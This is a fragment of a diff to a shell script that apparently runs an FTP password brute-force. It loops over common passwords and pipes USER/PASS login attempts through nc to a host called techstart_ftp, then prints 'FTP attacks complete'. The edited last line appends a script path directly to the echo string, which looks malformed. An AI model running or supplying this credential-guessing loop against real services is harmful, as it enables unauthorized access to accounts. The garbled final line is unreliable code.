@@ -12,4 +12,4 @@ for pass in password123 admin123 ftppass secret letmein; do
   echo -e "USER ftpuser\nPASS $pass\nquit" | nc techstart_ftp 21
 done
 
-echo "[+] FTP attacks complete"
+echo "[+] FTP attacks complete"/scripts/notify_attack.sh
